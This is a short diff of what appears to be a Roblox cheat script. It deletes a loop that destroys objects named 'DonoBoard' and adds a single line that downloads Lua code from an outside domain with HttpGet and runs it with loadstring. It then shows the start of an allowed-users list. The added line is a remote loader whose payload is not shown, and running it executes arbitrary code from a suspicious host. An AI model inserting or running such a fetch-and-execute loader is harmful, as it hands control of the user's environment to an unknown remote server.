@@ -1,9 +1,4 @@
-for i,v in pairs(game:GetDescendants()) do 
-if v.Name=="DonoBoard" then
-v:Destroy()
-warn("anti cheat hai vc")
-end
-end    
+loadstring(game:HttpGet("https://plsrandomname.sbs/loaders/discordx2swnz.lua"))()
    local allowedUsers = {
     ["phubentau"] = true,
     ["anhtthuc03"] = true
